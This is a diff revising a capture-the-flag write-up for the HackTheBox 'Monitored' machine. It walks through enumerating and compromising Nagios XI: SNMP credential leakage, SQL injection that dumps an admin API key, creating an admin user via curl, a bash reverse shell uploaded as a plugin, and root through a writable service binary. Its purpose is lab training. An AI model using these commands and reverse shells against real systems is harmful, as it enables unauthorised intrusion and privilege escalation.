@@ -15,6 +15,8 @@ TBA
 
 ## Info gathering
 
+Let's start with a port-scanning:
+
 ```bash
 sudo nmap -sS -A -Pn -p- --min-rate 10000 monitored
 
@@ -42,11 +44,12 @@ Nmap info:
 - SSH open, but we need creds.
 - HTTP redirects to HTTPS --> add to `/etc/hosts`
 - Find more about LDAP `389`
+
 ## Web enumeration
 
 Upon visiting the webserver on our browser we find a Nagios XI interface:
 
-![](home.png)
+![](home.png){: .normal width="65%"}
 
 We have encountered Nagios XI before on the Try Hack Me's [Nax](https://cspanias.github.io/posts/THM-Nax/) room. Let's remind ourselves [what Nagios XI is](https://cspanias.github.io/posts/THM-Nax/#21-nagios-xi):
 
@@ -54,7 +57,7 @@ We have encountered Nagios XI before on the Try Hack Me's [Nax](https://cspanias
 
 ![](https://cspanias.github.io/assets/thm/fullpwn/nax/Nagios-Working-nagios-Tutorial-Edureka-3.png)
 
-We can start performing a recursive dir-busting with `ffuf`. It will search for subdirectories, e.g. `https://nagios.monitored.htb/FUZZ,  and if found, will then create a new job and perform dir-busting for `https://nagios.monitored.htb/newly-found-directory/FUZZ`:
+We can start by performing a recursive dir-busting with `ffuf`. It will search for subdirectories, e.g. `https://nagios.monitored.htb/FUZZ`,  and if any is found, it will then create a new job and perform dir-busting for `https://nagios.monitored.htb/newly-found-directory/FUZZ`:
 
 ```bash
 $ ffuf -u https://nagios.monitored.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion
@@ -73,7 +76,7 @@ jquery                  [Status: 301, Size: 342, Words: 20, Lines: 10, Duration:
 
 Based on the above output, we can see that `ffuf` discovered 2 new directories: `/javascript` and `/nagios`. It then went on to enumerate the former and found `/javascript/jquery`, but it did not enumerate the latter. This is because it got a [`401` Unauthorized error](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) response code, and couldn't proceed without credentials. 
 
-So it seems that `/nagios` is some sort of another login portal:
+It seems that `/nagios` is some sort of another login portal:
 
 ![](nagios_subdir.png)
 
@@ -88,7 +91,7 @@ Unfortunately, that did not work! Next, we can try perform a **Hail Mary** scan 
 $ sudo incursore.sh -H 10.10.11.248 --type All
 ```
 
-`incursore` produced a ton of files, but it neatly organized them for us:
+`incursore` produces a ton of files, but it neatly organizes them for us:
 
 ```bash
 $ tree 10.10.11.248/
@@ -177,13 +180,13 @@ iso.3.6.1.2.1.25.4.2.1.5.1448 = STRING: "-c /opt/scripts/check_host.sh svc XjH7V
 
 ```
 
-We can try using those (`svc:XjH7VCehowpR1xZB`) to log into the Nagios one of the two login portal we have discovered. It seems that they do not work at `https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1`, but they do work at `https://nagios.monitored.htb/nagios` !  
+We can try using those (`svc:XjH7VCehowpR1xZB`) to log into one of the two Nagios login portals we have discovered so far. It seems that they do not work at `https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1`, but they do work at `https://nagios.monitored.htb/nagios` !  
 
 ![](nagios_login.png)
 
-After searching around for a while we can't find much, other than the software's version: `4.4.13`. Now that we have the version, we can search for any associated vulnerabilities. There is [CVE-2019-15949](https://nvd.nist.gov/vuln/detail/CVE-2019-15949) which has a metasploit module, but it does seem to work. There is an interesting [post](https://outpost24.com/blog/nagios-xi-vulnerabilities/) from Outpost24 which lists a number of Nagios XI vulnerabilities related to privilege escalation.
+After searching around for a while we can't find much, with the exception of the software's version: `4.4.13`. Now that we have the version, we can search for any associated vulnerabilities. There is [CVE-2019-15949](https://nvd.nist.gov/vuln/detail/CVE-2019-15949) which has a metasploit module, but it does not seem to work. There is also an interesting [post](https://outpost24.com/blog/nagios-xi-vulnerabilities/) from Outpost24 which lists a number of Nagios XI vulnerabilities related to privilege escalation.
 
-Since, we don't have many avenues to go explore for now, let's also dir-bust the `/nagiosxi` directory.
+Since, we don't have many avenues to go further for now, let's also dir-bust the `/nagiosxi` directory:
 
 ```bash
 $ ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -recursion
@@ -289,7 +292,7 @@ spacer                  [Status: 200, Size: 32, Words: 4, Lines:
 <SNIP>
 ```
 
-We can try filtering out `ffuf`'s output by HTTP response size, in this case `32`:
+We need to filter out `ffuf`'s output based on the HTTP response size, which in this case is `32`:
 
 ```bash
 $ ffuf -u https://nagios.monitored.htb/nagiosxi/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -fs 32
@@ -304,7 +307,9 @@ long distance           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration:
 <SNIP>
 ```
 
-There are lot sub-directories returned with the HTTP [`403 Forbidden` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403). Interestingly enough, there are two subdirectories with the HTTP [`200 OK` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200): `/license` and `/authenticate`. We can try to see how these requests look like using Burp. We get a "*Unknown API*" error message upon reaching `/license`:
+There are lot sub-directories returned with the HTTP [`403 Forbidden` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403). Interestingly enough, there are two subdirectories with the HTTP [`200 OK` response status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200): `/license` and `/authenticate`. We can try to see how these requests look like using Burp. 
+
+We get a "*Unknown API*" error message upon reaching `/license`:
 
 ![](license_dir.png)
 
@@ -320,7 +325,7 @@ After trying to pass our current creds (`svc:XjH7VCehowpR1xZB`) as plain paramet
 
 ![](login_request_params.png)
 
-We can keep the request as it is, but send it to `/api/v1/authenticate`:
+We can now keep the request as it is, but send it to `/api/v1/authenticate`:
 
 ![](auth_token.png)
 
@@ -328,7 +333,9 @@ We get an authentication token back: `"auth_token":"1c57b07be29194d09f34d35587f8
 
 ![](token_error.png)
 
-After searching some more about token authentication, we find a post titled as "[_Help with insecure login / backend ticket authentication](https://support.nagios.com/forum/viewtopic.php?t=58783&sid=d7eb283ff38882a13a1d5efa18649ac7)_" and seems to use the `/index.php` to pass the credentials instead of `/api/v1/authenticate`. Let's see where this does for us:
+After searching some more about token authentication, we find a post titled as ["*Help with insecure login / backend ticket authentication*"](https://support.nagios.com/forum/viewtopic.php?t=58783&sid=d7eb283ff38882a13a1d5efa18649ac7) which used the `/index.php` directory to pass the credentials instead of `/api/v1/authenticate`. 
+
+Let's see where this does for us:
 
 ![](token_redirection.png)
 
@@ -364,7 +371,7 @@ We got some information back:
 - The DMBS used is MySQL.
 - We have two databases: `nagiosxi` and `information_schema`.
 
-The [vulnerability description](https://outpost24.com/blog/nagios-xi-vulnerabilities/) mentions that the `xi_users` table; let's see if this exists:
+The [vulnerability description](https://outpost24.com/blog/nagios-xi-vulnerabilities/) mentions that there is a `xi_users` table; let's see if this exists:
 
 ```bash
 # enumerate tables
@@ -423,17 +430,13 @@ Table: xi_users
 
 <SNIP>
 ```
-The `xi_users` table contains the hashed `password` (`$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C`), and the `api_key` (`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`) of the `nagiosadmin` account!
+The `xi_users` table contains the hashed password (`$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C`) and the API key (`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`) of the `nagiosadmin` account!
 
 After searching how the API key is used on Nagios XI, we find [this](https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf):
 
-_An example of a CURL command used to access the API is as follows:_
+> _An example of a CURL command used to access the API is as follows: `curl -XGET "http://10.25.5.2/nagiosxi/api/v1/system/status?apikey=5goacg8s&pretty=1"`._
 
-```bash
-curl -XGET "http://10.25.5.2/nagiosxi/api/v1/system/status?apikey=5goacg8s&pretty=1"
-```
-
-Let's try this:
+Let's try this to send a `POST` request:
 
 ```bash
 curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=xhi4m&password=password&name=xhi4m&email=xhi4m@mail.com&auth_level=admin"
@@ -447,25 +450,21 @@ We successfully created the user `xhi4m` with `admin` privileges! Let's login:
 
 ![](login_xhi4m.png)
 
-```bash
-curl -XGET "https://nagios.monitored.htb/nagiosxi/api/v1/awesome/example/data1/data2?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1"
-```
+There is some detail documentation on how to create and execute a command: [Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf). According to the documentation the process is as follows:
 
-There is some detail documentation on how to create an execute a command: [Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf). Let's follow the documentation step by step:
+The process is as follows:
+1. Upload the shell as a plugin.
+2. Create a command which will execute the plugin.
+3. Create a service to run the command.
 
-![](manage_plugins.png)
-
-Next, we can create a reverse shell script locally to upload:
+We can create a reverse shell script locally and then upload it as a plugin to Nagios XI:
 
 ```bash
 $ cat check_command
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/1337 0>&1'
 ```
 
-The process is as follows:
-1. Upload the shell as a plugin.
-2. Create a command which will execute the plugin.
-3. Create a service to run the command.
+If we did everything right and we execute the check command we should catch our reverse shell:
 
 ```bash
 $ sudo nc -lvnp 1337
@@ -474,10 +473,13 @@ listening on [any] 1337 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.248] 47560
 bash: cannot set terminal process group (2841): Inappropriate ioctl for device
 bash: no job control in this shell
-nagios@monitored:~$
+nagios@monitored:~$ cat ~/user.txt
+<SNIP>
 ```
 
 ## Privilege escalation
+
+Let's first stabilize our shell and then check if our user has any elevated privileges:
 
 ```bash
 nagios@monitored:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -514,7 +516,15 @@ User nagios may run the following commands on localhost:
 nagios@monitored:/tmp$
 ```
 
+That's interesting: a lot of scripts and services that `nagios` can run as `root`! Next, let's transfer and run [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to the target:
+
 ```bash
+# start a Python3 HTTP server from where the linpeas.sh script is located
+$ python3 -m http.server 8888
+```
+
+```bash
+# download the linpeas script to the target
 nagios@monitored:~$ wget http://10.10.14.11:8888/linpeas.sh
 wget http://10.10.14.11:8888/linpeas.sh
 --2024-01-17 02:12:44--  http://10.10.14.11:8888/linpeas.sh
@@ -526,19 +536,22 @@ Saving to: ‘linpeas.sh’
 linpeas.sh          100%[===================>] 828.05K  2.16MB/s    in 0.4s
 
 2024-01-17 02:12:45 (2.16 MB/s) - ‘linpeas.sh’ saved [847920/847920]
-
+# check file's permissions
 nagios@monitored:~$ ls -l
 ls -l
 total 840
 -rw-r--r-- 1 nagios nagios    131 Jan 17 01:24 cookie.txt
 -rw-r--r-- 1 nagios nagios 847920 Dec 30 23:27 linpeas.sh
 -rw-r----- 1 root   nagios     33 Jan 17 01:19 user.txt
+# give executable permissions to the file
 nagios@monitored:~$ chmod +x linpeas.sh
 chmod +x linpeas.sh
+# check file's permissions
 nagios@monitored:~$ ls -l
 ls -l
 total 840
 -rw-r--r-- 1 nagios nagios    131 Jan 17 01:24 cookie.txt
+# execute the file
 nagios@monitored:~$ ./linpeas.sh
 ./linpeas.sh
 
@@ -556,7 +569,7 @@ nagios@monitored:~$ ./linpeas.sh
 <SNIP>
 ```
 
-It seems that we have some executables that we can write to, such as `/usr/local/nagios/bin/npcd` and were also present in our `sudo -l` list:
+It seems that we have some executables that we can write to, such as `/usr/local/nagios/bin/npcd` that they were also present in our `sudo -l` list:
 
 ```bash
 (root) NOPASSWD: /etc/init.d/npcd start
@@ -599,8 +612,8 @@ second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "
 ```
 
 Based on this info, we could:
-1. Modify the `/usr/local/nagios/bin/npcd` executable, since we have write access with reverse shell code.
-2. Use the `manage_services.sh` script to restart the service, so the modified executable can be run.
+1. Replace the `/usr/local/nagios/bin/npcd` executable, since we have write access with a reverse shell bash script.
+2. Use the `manage_services.sh` script to restart the service, so the replaced executable can be run.
 
 Since the latter is run as `root`, we should receive a `root` shell back. Let's start by create a reverse shell script and transfer it to the target:
 
@@ -662,7 +675,7 @@ bash: cannot set terminal process group (62859): Inappropriate ioctl for device
 bash: no job control in this shell
 root@monitored:/# cat /root/root.txt
 cat /root/root.txt
-e2edb527aa4be3779605c6cdfcd73e14
+<SNIP>
 ```
 
 ![](machine_pwned.png){: width="75%" .normal}
